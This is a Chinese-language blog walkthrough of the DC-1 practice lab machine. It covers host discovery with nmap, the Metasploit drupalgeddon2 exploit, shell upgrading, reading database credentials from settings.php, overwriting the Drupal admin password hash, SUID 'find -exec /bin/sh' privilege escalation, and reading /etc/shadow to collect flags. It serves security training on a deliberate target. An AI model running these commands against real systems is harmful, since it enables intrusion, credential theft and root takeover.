title="DC-1靶机安装和设置"></a>DC-1靶机安装和设置</h2><p>DC-1靶机相当于一个主机，内置有5个flag作为提示和渗透成功的证明。</p><p>安装好Vmwareworkstation并且激活之后，下载DC-1压缩包并解压。</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134019070.png" alt="image-20211031134019070" loading="lazy"></p><p>直接用Vmwareworkstation打开</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134059049.png" alt="image-20211031134059049" loading="lazy"></p><p>选择储存路径并导入</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134115299.png" alt="image-20211031134115299" loading="lazy"></p><p>一般此处会提示导入失败，重试即可</p><p><img src="C:/Users/86151/Desktop/git%20notes/mynotes/DC-1%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.assets/image-20211031134253670.png" alt="image-20211031134253670" loading="lazy"></p><p>配置靶机网络，为保证对靶机的渗透测试可以正常顺利进行，要将靶机放于同一个局域网下，所以要设置NAT模式</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134351589.png" alt="image-20211031134351589" loading="lazy"></p><p>选择这个，之后点击确定，并开启此虚拟机</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134427325.png" alt="image-20211031134427325" loading="lazy"></p><p>选择 是 即可</p><p>等待启动</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134517563.png" alt="image-20211031134517563" loading="lazy"></p><p>如图所示，即靶机启动成功，则可使用虚拟机作为攻击机，对目标靶机进行渗透测试</p><h2 id="DC-1渗透测试"><a href="#DC-1渗透测试" class="headerlink" title="DC-1渗透测试"></a>DC-1渗透测试</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>打开Kali虚拟机(root权限)</p><p>这里演示时使用的工具是Xshell，如果没有配置SSH，在Kali中使用终端操作是一样的。</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031134812688.png" alt="image-20211031134812688" loading="lazy"></p><p>首先进行主机发现，由于靶机与虚拟机属于同一C段下，所以考虑使用nmap拿到靶机的ip地址。</p><p>使用ifconfig命令，拿到这台虚拟机的内网ip，通常是eth0对应的inet地址</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031135036491.png" alt="image-20211031135036491" loading="lazy"></p><p>由于靶机与虚拟机处于同一c段，所以只需要扫描位于同一c段的主机，就可以进行主机发现。</p><p>可以简单理解为，虚拟机ip为192.168.10.131，而靶机ip为192.168.10.XXX，现在需要找到靶机的ip地址</p><p>使用命令 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ip/24 -oN nmap.sP</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031135133970.png" alt="image-20211031135133970" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031135406057.png" alt="image-20211031135406057" loading="lazy"></p><p>其中 -sP参数表示使用ping扫描, -oN是写入到其后的文件，在此条命令中表示将结果写入nmap.sP中，ip/24表示该ip下的所有c段</p><p>从扫描结果得知，该靶机的ip地址为192.168.10.142 (不同环境对应的ip不同，只是我的主机对应着192.168.10.142，所以本文中所有写着192.168.10.142的地方，要根据自己本机电脑情况选择ip替换)</p><p>进行下一步的信息收集，要查看靶机开放了什么端口，端口上运行了什么服务，以便后续有针对性的进行渗透计划。</p><p>此处同样使用nmap工具，命令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 靶机ip -oN nmap.A</span><br></pre></td></tr></table></figure><p>-A参数表示全面扫描，通常对单个ip地址使用，同时-oN将结果写入nmap.A中</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031140426945.png" alt="image-20211031140426945" loading="lazy"></p><p>此处表示靶机开放了22端口，上面运行着ssh服务</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031140719343.png" alt="image-20211031140719343" loading="lazy"></p><p>此处表示靶机开放了80端口，上面运行着http服务，同时80端口一般对应着web页面，一般来说，如果没有经过特别配置，直接使用访问ip地址即可访问到该主机对应的http服务。简单来说，就是靶机开放了一个web页面，在浏览器直接输入该ip即可访问。nmap还扫出来一些信息，比如该网站使用了Drupal 7框架，存在robots.txt文件，使用了Apache/2.2.22等信息</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031140743602.png" alt="image-20211031140743602" loading="lazy">    </p><p>此处表示开放111端口，该端口存在漏洞但并未验证，也并非本次渗透测试的攻击方向，想了解相关服务内容和漏洞验证及漏洞利用方法的，可以自己去查一下（我也不会）</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031141129273.png" alt="image-20211031141129273" loading="lazy"></p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>由于靶机开放了22端口和80端口，对于22端口上的ssh服务，如果不知道用户名和密码，尝试爆破是一件很繁琐且效率很低的方法，所以考虑从网页入手。</p><p>使用浏览器访问该ip对应的web页面</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031141529735.png" alt="image-20211031141529735" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031141542751.png" alt="image-20211031141542751" loading="lazy"></p><p>使用Wappalyzer插件发现，以及刚刚nmap中扫出来的信息提示，该网站的建站系统为Drupal 7。第一思路为去网上找有没有drupal 7的漏洞利用方式。</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031141749573.png" alt="image-20211031141749573" loading="lazy"></p><p>可以看到有很多关于drupal 7的漏洞，推荐有兴趣的同学可以根据上面的教程手工利用，合理使用搜索引擎复现利用nday漏洞也是一项很重要的技能，并且由于drupal的最新版本应该为11左右，所以对于drupal 7 肯定会有多个可以利用的漏洞。</p><p>这里更多出于介绍的目的，使用一款新的工具metasploit</p><h2 id="获取webshell-shell"><a href="#获取webshell-shell" class="headerlink" title="获取webshell(shell)"></a>获取webshell(shell)</h2><p><strong>使用命令msfconsole</strong></p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031142037618.png" alt="image-20211031142037618" loading="lazy"></p><p>metasploit这款工具非常强大，同时拥有许多功能、内置了许多脚本，短短的一篇介绍不完，但是工具终究是工具，熟练使用工具很重要，但是渗透的思路和手工尝试更重要。此处只是出于介绍目的介绍工具，并不希望大家依赖工具，不然只能成为一个脚本小子。</p><p>说回正题，尝试在metasploit里查找有没有相关的利用脚本。</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br></pre></td></tr></table></figure><p>此处搜索到以下几个模块，通过模块名字和Rank的综合分析，可以尝试考虑使用第0或第1个，由于我测试过第0个无法使用，故演示只演示第一个</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031142759755.png" alt="image-20211031142759755" loading="lazy"></p><p>使用命令来使用该模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="DC-1%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.assets/image-20211031143316570.png" alt="image-20211031143316570" loading="lazy"></p><p>使用命令来进行参数设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031143329551.png" alt="image-20211031143329551" loading="lazy"></p><p>对于Required为yes的项都需要设置才能使用，此处设置RHOSTS为目标靶机ip</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.10.142</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031143501598.png" alt="image-20211031143501598" loading="lazy"></p><p>使用命令exploit 启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p>可以看到已经攻击成功，已经建立了一个meterpreter会话，可以理解为建立了一个反弹shell</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031144009034.png" alt="image-20211031144009034" loading="lazy"></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>进入shell中，并尝试使用几个命令</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031144512068.png" alt="image-20211031144512068" loading="lazy"></p><p>但这个shell并不是一个交互式shell，对于后续的渗透测试很不方便，我们需要将这个shell变为交互式shell，关于交互式shell和非交互式shell的不同，还是希望大家能自己手动查查。</p><p>由于使用python -v发现靶机上装了python2.7，则考虑可以使用python中的命令来唤出交互式shell</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031144904175.png" alt="image-20211031144904175" loading="lazy"></p><p>先按下Ctrl+Z强制结束当前的shell,输入y确定</p><p>回退到meterpreter会话</p><p>再输入命令进入到非交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>再使用python使用交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031145515760.png" alt="image-20211031145515760" loading="lazy"></p><p>输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p>查看该目录下的文件</p><p><img src="C:/Users/86151/Desktop/git%20notes/mynotes/DC-1%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.assets/image-20211031145633167.png" alt="image-20211031145633167" loading="lazy"></p><p>可以看到flag1.txt</p><p>查看一下该文件</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031145757831.png" alt="image-20211031145757831" loading="lazy"></p><p>文件中提示，每一个CMS都需要一个config file，则提示我们要去找这个config file，可能下一个flag会在那个地方</p><p>首先考虑当前目录下的这个web.config</p><p>cat一下看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat web.config</span><br></pre></td></tr></table></figure><p>发现并没有任何有价值的东西，则考虑去其他文件目录下找</p><p>直接去网上搜drupal的文件结构 发现3.6 sites文件夹中有一个配置文件setting.php 则尝试去看看</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031150311736.png" alt="image-20211031150311736" loading="lazy"></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lscd siteslscd defaultls</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031150356548.png" alt="image-20211031150356548" loading="lazy"></p><p>看一下settings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat settings.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031150451186.png" alt="image-20211031150451186" loading="lazy"></p><p>可以看到flag2以及mysql数据库的配置文件</p><p>flag2提示道：不要尝试字典爆破</p><p>此处他给了我们mysql的配置文件，那我们干脆就尝试登陆一下mysql</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031150632304.png" alt="image-20211031150632304" loading="lazy"></p><p>登陆到mysql，看看数据库有没有什么敏感信息</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031150718312.png" alt="image-20211031150718312" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="C:/Users/86151/Desktop/git%20notes/mynotes/DC-1%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.assets/image-20211031150821180.png" alt="image-20211031150821180" loading="lazy"></p><p>拉到最下面可以看到 此处有一张表名为users,一般名为users的表都存着敏感信息，查看一下这张表。</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p>考虑到显示不太好看 使用\G参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users \G;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031151015433.png" alt="image-20211031151015433" loading="lazy"></p><p>可以看到该表中存放着admin的敏感信息，猜测可能是用于网站后台的登录，但密码却经过了加密。</p><p>由于flag2中提示我们不要尝试着去暴力破解，既然我们没有办法得到它的密码，但由于我们拥有数据库的权限，可以考虑将我们已知的密码加密之后覆盖原来的密码，就可以将我们已知的密码拿来登录，接下来的思路便是，如何加密。</p><p>直接去google一下drupal的用户密码是如何加密的</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031151359642.png" alt="image-20211031151359642" loading="lazy"></p><p>查找到这篇文章 发现scripts下有一个加密脚本，可以直接使用</p><p>先退出mysql</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 123 &gt;password.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat password.txt</span><br></pre></td></tr></table></figure><p>拿到加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$S$DkN.RoKXZxoV58CBBB6ffl/FcI79v.iXXsAFeAPPwiS6OHvBkBR1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031153331795.png" alt="image-20211031153331795" loading="lazy"></p><p>接下来拿这行密码去替换mysql中的admin的密码</p><p>进入mysql</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DkN.RoKXZxoV58CBBB6ffl/FcI79v.iXXsAFeAPPwiS6OHvBkBR1&#x27; where uid=1;</span><br></pre></td></tr></table></figure><p>重新再查一下发现修改成功<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031153742026.png" alt="image-20211031153742026" loading="lazy"></p><p>尝试用这个用户登录</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031153846492.png" alt="image-20211031153846492" loading="lazy"></p><p>登陆成功，此时相当于拿到网页后台权限。按照一般的渗透流程，可以考虑先拿webshell，再拿真正主机的shell，此处由于靶机设计原因情况比较特殊，但无论如何渗透思路多种多样，只要拿到权限就是成功。</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031154036356.png" alt="image-20211031154036356" loading="lazy"></p><p>随便点一点发现此处存在flag3</p><p><img src="DC-1%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.assets/image-20211031154146140.png" alt="image-20211031154146140" loading="lazy"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>根据flag3中提到的关键词 perms find passwd -exec ，无论是正常的渗透测试流程，还是此处给出的提示，都在指引我们走向提权。</p><p>此处flag提示的意义在于，它想让我们去读取/etc/passwd，但事实上这个文件需要root权限才能读取，而我们只是一般的普通用户权限，故此处考虑提权。</p><p>提权的方式有很多，此处根据靶场设计来提权，由于提示了perm，则考虑使用具有suid的命令来提权</p><p>什么是suid suid的命令为什么可以提权 需要大家自行百度</p><p>对于拥有suid的命令来说，它最显而易见的特点是，使用该命令时，执行命令的权限为文件拥有者的权限，而不是使用命令者的权限。</p><p>使用命令查找具有这样特点的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031154941141.png" alt="image-20211031154941141" loading="lazy"></p><p>发现find拥有这样的特点 而find中的参数-exec 可以执行其后跟随的命令</p><p>于是我们精心构造一个命令，通过拥有root权限的find来启用一个shell</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find password.txt -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure><p>password.txt最好为一个可以找到的文件，因为刚刚在密码那个环节生成了一个password.txt，所以此处就选择了password.txt，但此处没有特殊含义，任何一个在该目录存在下的文件都可以放这，重点在于-exec后跟着的命令</p><p>执行/bin/sh 可以粗略地认为这时启动了一个shell 随后的反斜杠是因为考虑不同系统间可能存在符号不一致进行的转义。<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031155441201.png" alt="image-20211031155441201" loading="lazy"></p><p>得到root权限</p><p>查看一下/etc/passwd  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>发现没什么东西</p><p>看一下/etc/shadow</p><p>为什么看/etc/shadow需要大家自行了解这两个文件的关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shawdow</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031155805283.png" alt="image-20211031155805283" loading="lazy"></p><p>发现flag4，并且其后有加密过的密码</p><p>靶场设计思路是让我们去爆破这个密码，此处可以使用hydra工具，大家可以尝试去使用。</p><p>但事实上我们此处已经拥有了root权限，要去找flag4这个用户的密码就很无聊，直接去找flag4就可以了</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag4*</span><br></pre></td></tr></table></figure><p>该命令表示 搜索根目录(/)下的所有文件 -name参数表示符合其后内容的文件名</p><p>*为linux中的通配符 此处可以理解为任意字符任意数量</p><p>即flag4.lsjyyds flag4.lsjsb 都可以匹配到</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031160552116.png" alt="image-20211031160552116" loading="lazy"></p><p>可以直接找到flag4.txt</p><p>cat一下</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031160625737.png" alt="image-20211031160625737" loading="lazy"></p><p>他说我们可以用同样的方法来得到/root下的flag</p><p>那既然我们已经是root权限了，</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211031160807052.png" alt="image-20211031160807052" loading="lazy"></p><p>至此，你已拿到这台主机的root权限，对于单个靶机的渗透测试也就告一段落。但在事实的生产环境中，如果这台主机还连接了其他的内网服务，还可以使用一些特别的技巧使这台主机当做类似跳板，来完成对其他内网服务的访问以及再渗透测试。此次渗透测试的主要目的还是配置一下虚拟机，了解靶场的安装，熟悉一些简单的linux命令，比如cd ls pwd cat等等，以及几款工具如metasploit,hydra,nmap的基本使用，还有一些比较常规的渗透思路。如果你已成功的通过自己努力复现本次靶机的渗透测试并且拿到最后的flag，那么恭喜你已经逐渐开始入门，并且已经拥有独立解决问题的能力了。</p><h1 id="end"><a href="#end" class="headerlink" title="end"></a><strong>end</strong></h1>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
